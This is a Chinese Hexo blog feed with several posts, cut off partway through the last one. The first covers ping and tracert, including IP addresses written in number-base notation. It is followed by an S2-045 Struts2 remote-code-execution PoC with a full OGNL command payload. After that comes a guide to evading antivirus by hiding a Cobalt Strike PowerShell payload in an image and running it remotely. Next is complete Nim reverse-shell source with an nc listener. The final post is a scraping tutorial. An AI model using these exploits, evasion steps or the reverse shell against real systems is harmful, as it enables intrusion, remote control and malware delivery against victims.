title="Tracert"></a>Tracert</h4><p>Tracert程序主要用于查看数据包从源端到目的端的路径信息，从而检查网络连接是否可用。当网络出现故障时，用户可以使用该命令定位故障点。</p><p>Tracert利用ICMP超时信息和目的不可达信息来确定从一个主机到网络上其他主机的路由，并显示IP网络中每一跳的延迟（这里的延迟是指：分组从信息源发送到目的地所需的时间，延迟也分为许多的种类——传播延迟、传输延迟、处理延迟、排队延迟等）。</p><h4 id="NQA"><a href="#NQA" class="headerlink" title="NQA"></a>NQA</h4><p>网络质量分析NQA（Network Quality Analysis）是一种实时的网络性能探测和统计技术，可以对响应时间、网络抖动、丢包率等网络信息进行统计。NQA能够实时监视网络服务质量，在网络发生故障时进行有效的故障诊断和定位。</p><p>利用不同类型的ICMP报文，NQA实现了Ping和Tracert功能的扩展和增强，可以实现对网络运行状况的准确测试，输出统计信息。比如NQA的ICMP测试、ICMP Jitter测试和Trace测试等。</p><ul><li><p>ICMP测试</p><p>ICMP测试是通过发送ICMP Echo请求报文和Echo响应报文来判断目的地的可达性、计算网络响应时间及丢包率，从而清晰地反映出网络性能及畅通情况。ICMP测试提供类似于命令行下的Ping命令功能，但输出信息更为丰富。</p></li><li><p>ICMP Jitter测试</p><p>ICMP Jitter测试是以ICMP报文为承载，通过记录在报文中的时间戳信息来统计时延、抖动、丢包的一种测试方法。Jitter（抖动时间）是指相邻两个报文的接收时间间隔减去这两个报文的发送时间间隔。</p></li><li><p>Trace测试</p><p>NQA的Trace测试用于检测源端到目的端的转发路径，并沿该路径记录源设备到中间各个设备的时延等信息。Trace测试类似于Tracert命令功能，但输出信息更为丰富。每一跳信息中能够显示平均时延、丢包、最后一个包接收时间等信息。</p></li></ul><h2 id="Bx-Ping-Decimalism"><a href="#Bx-Ping-Decimalism" class="headerlink" title="Bx Ping Decimalism"></a>Bx Ping Decimalism</h2><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre class=" language-shell"><code class="language-shell">ping [decimal numeral]</code></pre><p>不过，你需要将我们的IP地址转换成十进制数，因为IP地址是点分十进制</p><p>转换工具：<a href="http://www.jsons.cn/ipnum/">http://www.jsons.cn/ipnum/</a></p><p>例如ping 220.181.38.251，百度的IP地址为例。转换成十进制后为3702859515</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705222006782.png"></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>IP地址换换成数字地址的方法如下：</p><p>例子：219.239.110.138</p><p>具体计算过程如下：</p><p>219*2563+ 239*2562+110*2561+138*2560=3689901706</p><p>219.239.110.138–&gt;3689901706</p><p>转换后的3689901706即为ip 219.239.110.138的数字地址</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre class=" language-shell"><code class="language-shell">ping 3702859515</code></pre><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705222059128.png"></p><h2 id="Cx-Ping-Octal"><a href="#Cx-Ping-Octal" class="headerlink" title="Cx Ping Octal"></a>Cx Ping Octal</h2><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><pre class=" language-shell"><code class="language-shell">ping 0[Octal number]</code></pre><p>首先将点分十进制转为十进制，然后再转为八进制，在八进制前添加一个0标识为八进制即可</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><pre class=" language-shell"><code class="language-shell">ping 033455223373</code></pre><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705222826724.png"></p><h2 id="Dx-Ping-Hexadecimal"><a href="#Dx-Ping-Hexadecimal" class="headerlink" title="Dx Ping Hexadecimal"></a>Dx Ping Hexadecimal</h2><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><pre class=" language-shell"><code class="language-shell">ping 0x[hexadecimal number]</code></pre><p>同样将IP地址转为十进制，再转为十六进制，然后使用0x标识为十六进制。</p><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><pre class=" language-shell"><code class="language-shell">ping 0xDCB526FB</code></pre><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705223143307.png"></p><h2 id="Ex-Ping-Binary"><a href="#Ex-Ping-Binary" class="headerlink" title="Ex Ping Binary"></a>Ex Ping Binary</h2><blockquote><p>ping二进制数似乎是被禁止的，我尝试了多种方法都无法实现。</p></blockquote><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705223504104.png"></p><p>既然如此，那就要使用一些shell的思想了，首先我们要对二进制进行转换成任意进制，因为目前就剩下二进制无法实现。</p><p>首先CMD肯定是无法实现进制转换的（反正我没找到二进制相关命令，八进制十六进制是可以使用set /A的）。</p><p>所以使用Powershell的进制转换工具来实现。</p><h3 id="Powershell-Conversion"><a href="#Powershell-Conversion" class="headerlink" title="Powershell Conversion"></a>Powershell Conversion</h3><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><pre class=" language-shell"><code class="language-shell">[System.Convert]::ToInt64([binary number],2)</code></pre><h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><p>发现报错了，经过测试，删除四位后，成功。在数字大小上受到了限制。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705224826909.png"></p><h4 id="分离"><a href="#分离" class="headerlink" title="分离"></a>分离</h4><p>解决思路，分段拼接。</p><p>百度的IP地址为：219.239.110.138</p><p>转为十进制：3702859515</p><p>转为二进制：11011100101101010010011011111011</p><p>分段为两部分：37028 | 59515</p><p>二进制：1001000010100100 | 1110100001111011</p><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><pre class=" language-shell"><code class="language-shell">$a=([System.Convert]::ToInt64(1001000010100100,2));$b=([System.Convert]::ToInt64(1110100001111011,2))</code></pre><h4 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h4><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705225452520.png"></p><p>怎么感觉还是挺费劲的，转场Linux吧，走走走</p><h3 id="Linux-Shell-Conversion"><a href="#Linux-Shell-Conversion" class="headerlink" title="Linux Shell Conversion"></a>Linux Shell Conversion</h3><p>思路也是同样的思路，先转换进制赋值给变量，再使用Ping命令。</p><h4 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h4><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705230801738.png"></p><h2 id="Fx-Ping-Other"><a href="#Fx-Ping-Other" class="headerlink" title="Fx Ping Other"></a>Fx Ping Other</h2><blockquote><p>不仅可以ping二级制，十进制，十六进制，八进制，其实使用点分十进制的时候，也可以单个转换。</p></blockquote><h4 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h4><pre class=" language-python"><code class="language-python">ping <span class="token number">110.1</span><span class="token punctuation">.</span><span class="token number">1.0130</span></code></pre><p>这个IP地址合法吗，合法。</p><p>0130是八进制的表示，也就是说，ping命令在识别到0开头的数字时会降为八进制数，那么ping这个地址，130会变成88。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705233424811.png"></p><h4 id="混和"><a href="#混和" class="headerlink" title="混和"></a>混和</h4><blockquote><p>让我们分别用二级制、十进制、十六进制、八进制来结合一下。</p></blockquote><p><img src="https://lit.enomothem.com/zhixinghe/image-20220705234413382.png"></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>这样的设计不知道是缺陷还是Bug还是漏洞还是正常功能，虽然不影响使用，但是如果我们需要精确匹配正常的IP地址的话，我们需要使用正则，语法如下：</p><pre class=" language-shell"><code class="language-shell">25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])</code></pre><h2 id="Gx-References"><a href="#Gx-References" class="headerlink" title="Gx References"></a>Gx References</h2><p>[1] <a href="https://www.bbsmax.com/A/n2d9lomv5D/">https://www.bbsmax.com/A/n2d9lomv5D/</a></p><p>[2] <a href="https://www.rfc-editor.org/rfc/rfc777.txt">https://www.rfc-editor.org/rfc/rfc777.txt</a></p><p>[3] <a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/ICMP.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/ICMP.html</a></p><p>[4] <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.convert.toint64?view=net-6.0">https://docs.microsoft.com/zh-cn/dotnet/api/system.convert.toint64?view=net-6.0</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP/IP </tag>
            
            <tag> OSI </tag>
            
            <tag> ICMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现S2-045:远程代码执行</title>
      <link href="posts/efa2.html"/>
      <url>posts/efa2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Struts2-远程代码执行漏洞"><a href="#Apache-Struts2-远程代码执行漏洞" class="headerlink" title="Apache Struts2 远程代码执行漏洞"></a>Apache Struts2 远程代码执行漏洞</h1><h2 id="Ax-漏洞介绍"><a href="#Ax-漏洞介绍" class="headerlink" title="Ax 漏洞介绍"></a>Ax 漏洞介绍</h2><p>Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。<br>恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p><p>影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><h2 id="Bx-搭建漏洞环境"><a href="#Bx-搭建漏洞环境" class="headerlink" title="Bx 搭建漏洞环境"></a>Bx 搭建漏洞环境</h2><p>使用docker-compose快速搭建环境，运行命令的时候需要到指定目录下，就是存在<code>docker-compose.yml</code>文件的目录中。</p><pre class=" language-shell"><code class="language-shell">$ docker-compose up # 开启漏洞环境$ docker-compose ps # 查看开启列表$ docker-compose down # 关闭</code></pre><p>查看是否开启，可以看到端口8080已经开启。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220703223025237.png"></p><p>在虚拟机里启动后，就可以访问该IP:8080</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220703223314149.png"></p><h2 id="Bx-验证"><a href="#Bx-验证" class="headerlink" title="Bx 验证"></a>Bx 验证</h2><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>Python POC脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding:utf-8</span><span class="token keyword">import</span> urllib2<span class="token keyword">import</span> sys<span class="token keyword">from</span> poster<span class="token punctuation">.</span>encode <span class="token keyword">import</span> multipart_encode<span class="token keyword">from</span> poster<span class="token punctuation">.</span>streaminghttp <span class="token keyword">import</span> register_openers<span class="token keyword">def</span> <span class="token function">poc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    register_openers<span class="token punctuation">(</span><span class="token punctuation">)</span>    datagen<span class="token punctuation">,</span> header <span class="token operator">=</span> multipart_encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"image1"</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">"tmp.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    header<span class="token punctuation">[</span><span class="token string">"User-Agent"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>    header<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"</span><span class="token operator">+</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"</span>    request <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>datagen<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">print</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>poc<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><pre class=" language-http"><code class="language-http">POST / HTTP/1.1<span class="token header-name keyword">Host:</span> localhost:8080<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> en-US,en;q=0.8,es;q=0.6<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Length:</span> 0<span class="token header-name keyword">Content-Type:</span> %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data</code></pre><p>使用Burp发送POST包验证</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220703225130297.png"></p><h2 id="Cx-利用"><a href="#Cx-利用" class="headerlink" title="Cx 利用"></a>Cx 利用</h2><p>话不多说，直接上工具，达到一个远程命令执行的目的。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220703224327073.png"></p><p>收工。</p><h2 id="Dx-声明"><a href="#Dx-声明" class="headerlink" title="Dx 声明"></a>Dx 声明</h2><ul><li>请遵守，爱护《中华人民共和国网络安全法》</li><li>仅供学习参考！</li><li>请注明出处！</li></ul><h2 id="Ex-参考"><a href="#Ex-参考" class="headerlink" title="Ex 参考"></a>Ex 参考</h2><ul><li><a href="http://struts.apache.org/docs/s2-045.html">http://struts.apache.org/docs/s2-045.html</a></li><li><a href="https://blog.csdn.net/u011721501/article/details/60768657">https://blog.csdn.net/u011721501/article/details/60768657</a></li><li><a href="https://paper.seebug.org/247/">https://paper.seebug.org/247/</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/">https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-045">https://cwiki.apache.org/confluence/display/WW/S2-045</a></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentesting </tag>
            
            <tag> Struts2 </tag>
            
            <tag> S2-045 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell分离免杀</title>
      <link href="posts/ef8b.html"/>
      <url>posts/ef8b.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Powershell分离免杀"><a href="#Ax-Powershell分离免杀" class="headerlink" title="Ax Powershell分离免杀"></a>Ax Powershell分离免杀</h2><p>可以免杀主流的杀软，Defender不行</p><p>powershell是一个很好的东西。</p><h2 id="Bx-步骤"><a href="#Bx-步骤" class="headerlink" title="Bx 步骤"></a>Bx 步骤</h2><p>免杀原理就是将payload注入图片，然后远程解析payload并注入到目标机的powershell的进程中，适用于在内网中出网的情况，属于分离和进程注入两者的混合拳 </p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li>准备一张图片至少1920*1200，备用</li><li>CS</li><li>Invoke-psmage脚本</li></ul><p> 工具：Invoke-PSImage 下载：<a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a></p><h3 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h3><p>CS生成一个powershell脚本</p><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>将木马和图片放入Invoke工具目录下，POWERSHELL执行命令</p><p># import-Module .\Invoke-PSImage.ps1</p><p># Invoke-PSImage -Script .\payload.ps1 -Image .\a.jpeg -Out ax.jpeg -Web</p><p>将生成的代码放入文本文件编辑</p><h3 id="托管"><a href="#托管" class="headerlink" title="托管"></a>托管</h3><p>目录之中多出了一个代码混淆之后的马子图片</p><p>下一步</p><p>将产生的图片马放入CS服务器中生成一条<del>连</del>链接</p><p>攻击》web钓鱼》文件托管</p><p>关键参数：</p><p>文件：马子图片</p><p>Local URI：链接后的目录 如：/image/ax.jpeg</p><p>然后将CS生成的链接替换代码中的URL</p><p>在客户端使用powershell运行此代码即可。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220629002053865.png"></p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220629002115351.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> AntiVirus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
            <tag> 分离免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nim socket 免杀</title>
      <link href="posts/7a52.html"/>
      <url>posts/7a52.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Nim-socket-免杀"><a href="#Ax-Nim-socket-免杀" class="headerlink" title="Ax Nim socket 免杀"></a>Ax Nim socket 免杀</h2><p>可以免杀主流的杀软</p><h2 id="Bx-步骤"><a href="#Bx-步骤" class="headerlink" title="Bx 步骤"></a>Bx 步骤</h2><p>Nim源代码</p><pre class=" language-nim"><code class="language-nim"><span class="token keyword">import</span> net<span class="token keyword">import</span> osproc<span class="token keyword">import</span> os<span class="token keyword">var</span> ip <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">var</span> port <span class="token operator">=</span> <span class="token number">53</span><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token function">newSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> finalcommand <span class="token operator">:</span> string<span class="token keyword">while</span> true<span class="token operator">:</span>    <span class="token keyword">try</span><span class="token operator">:</span>        socket<span class="token operator">.</span><span class="token function">connect</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span><span class="token function">Port</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> true<span class="token operator">:</span>            <span class="token keyword">try</span><span class="token operator">:</span>                socket<span class="token operator">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;nimshell>"</span><span class="token punctuation">)</span>                <span class="token keyword">var</span> command <span class="token operator">=</span> socket<span class="token operator">.</span><span class="token function">recvLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"bye"</span><span class="token operator">:</span>                    socket<span class="token operator">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"退出 NIM SHELL"</span><span class="token punctuation">)</span>                    socket<span class="token operator">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                    system<span class="token operator">.</span><span class="token function">quit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> system<span class="token operator">.</span>hostOS <span class="token operator">==</span> <span class="token string">"windows"</span><span class="token operator">:</span>                    finalcommand <span class="token operator">=</span> <span class="token string">"cmd /C"</span> <span class="token operator">&amp;</span> command                <span class="token keyword">else</span><span class="token operator">:</span>                    finalcommand <span class="token operator">=</span> <span class="token string">"/bin/sh -c"</span> <span class="token operator">&amp;</span> command                <span class="token keyword">var</span> <span class="token punctuation">(</span>cmdres<span class="token punctuation">,</span> _<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">execCmdEx</span><span class="token punctuation">(</span>finalcommand<span class="token punctuation">)</span>                socket<span class="token operator">.</span><span class="token function">send</span><span class="token punctuation">(</span>cmdres<span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token operator">:</span>                socket<span class="token operator">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                system<span class="token operator">.</span><span class="token function">quit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token operator">:</span>        echo <span class="token string">"fail,5s continue.."</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span></code></pre><blockquote><p>注意，不允许使用制表符，替换为空格即可。</p></blockquote><p>编译成C</p><pre class=" language-nim"><code class="language-nim">nim c <span class="token operator">-</span>d<span class="token operator">:</span>mingw socket免杀<span class="token operator">.</span>nim<span class="token operator">//</span> C是编译成C语言，<span class="token operator">-</span>d<span class="token operator">:</span>mingw是编译成windows下可以执行的dll或exe。</code></pre><p>服务端</p><pre class=" language-shell"><code class="language-shell">nc -nlvp 53</code></pre><p>免杀状态</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220628103111395.png"></p><p>服务端</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220628103234016.png"></p><h2 id="Cx-Refer"><a href="#Cx-Refer" class="headerlink" title="Cx Refer"></a>Cx Refer</h2><p><a href="https://blog.csdn.net/csdnmmd/article/details/123672531">https://blog.csdn.net/csdnmmd/article/details/123672531</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> AntiVirus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nim </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Spider 1</title>
      <link href="posts/2de7.html"/>
      <url>posts/2de7.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python-Spider"><a href="#Ax-Python-Spider" class="headerlink" title="Ax Python Spider"></a>Ax Python Spider</h2><p>网络爬虫又称网络蜘蛛、网络机器人，它是一种按照一定的规则自动浏览、检索网页信息的程序或者脚本。网络爬虫能够自动请求网页，并将所需要的数据抓取下来。通过对抓取的数据进行处理，从而提取出有价值的信息。</p><p>搜索引擎就是大型的爬虫，比如百度、搜狗、360浏览器、谷歌搜索，所以我们才能搜索到想要的信息。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>爬虫可分为三大类：通用网络爬虫、聚焦网络爬虫、增量式网络爬虫。</p><p><strong>通用网络爬虫</strong>：是搜索引擎的重要组成部分，上面已经进行了介绍，这里就不再赘述。通用网络爬虫需要遵守 robots 协议，网站通过此协议告诉搜索引擎哪些页面可以抓取，哪些页面不允许抓取。</p><blockquote><p><code>robots 协议</code>：是一种“约定俗称”的协议，并不具备法律效力，它体现了互联网人的“契约精神”。行业从业者会自觉遵守该协议，因此它又被称为“君子协议”。</p></blockquote><p><strong>聚焦网络爬虫</strong>：是面向特定需求的一种网络爬虫程序。它与通用爬虫的区别在于，聚焦爬虫在实施网页抓取的时候会对网页内容进行筛选和处理，尽量保证只抓取与需求相关的网页信息。聚焦网络爬虫极大地节省了硬件和网络资源，由于保存的页面数量少所以更新速度很快，这也很好地满足一些特定人群对特定领域信息的需求。</p><p><strong>增量式网络爬虫</strong>：是指对已下载网页采取增量式更新，它是一种只爬取新产生的或者已经发生变化网页的爬虫程序，能够在一定程度上保证所爬取的页面是最新的页面。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>爬虫程序与其他程序不同，它的的思维逻辑一般都是相似的， 所以无需我们在逻辑方面花费大量的时间。下面对 Python 编写爬虫程序的流程做简单地说明：</p><ul><li>先由 urllib 模块的 request 方法打开 URL 得到网页 HTML 对象。</li><li>使用浏览器打开网页源代码分析网页结构以及元素节点。</li><li>通过 Beautiful Soup 或则正则表达式提取数据。</li><li>存储数据到本地磁盘或数据库。</li></ul><p>当然也不局限于上述一种流程。编写爬虫程序，需要您具备较好的 Python 编程功底，这样在编写的过程中您才会得心应手。爬虫程序需要尽量伪装成人访问网站的样子，而非机器访问，否则就会被网站的反爬策略限制，甚至直接封杀 IP，相关知识会在后续内容介绍</p><h3 id="网页"><a href="#网页" class="headerlink" title="网页"></a>网页</h3><p>网页一般由三部分组成，分别是 HTML（超文本标记语言）、CSS（层叠样式表）和 JavaScript（简称“JS”动态脚本语言），它们三者在网页中分别承担着不同的任务。</p><ul><li>HTML 负责定义网页的内容</li><li>CSS 负责描述网页的布局</li><li>JavaScript 负责网页的行为</li></ul><h4 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h4><p>访问速度快，找到url规律就可以实现爬取。</p><h4 id="动态网页"><a href="#动态网页" class="headerlink" title="动态网页"></a>动态网页</h4><p>可以实现局部的更新，但响应速度慢，爬取较为复杂。</p><h2 id="Bx-Get-HTML-information"><a href="#Bx-Get-HTML-information" class="headerlink" title="Bx Get HTML information"></a>Bx Get HTML information</h2><h3 id="获取响应对象"><a href="#获取响应对象" class="headerlink" title="获取响应对象"></a>获取响应对象</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 导包,发起请求使用urllib库的request请求模块</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment" spellcheck="true"># urlopen()向URL发请求,返回响应对象,注意url必须完整</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com/'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>http<span class="token punctuation">.</span>client<span class="token punctuation">.</span>HTTPResponse object at <span class="token number">0x0000018688441AF0</span><span class="token operator">></span></code></pre><h3 id="输出HTML信息"><a href="#输出HTML信息" class="headerlink" title="输出HTML信息"></a>输出HTML信息</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 导包,发起请求使用urllib库的request请求模块</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment" spellcheck="true"># urlopen()向URL发请求,返回响应对象,注意url必须完整</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com/'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># -- 输出HTML --</span><span class="token comment" spellcheck="true">#提取响应内容</span>html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment" 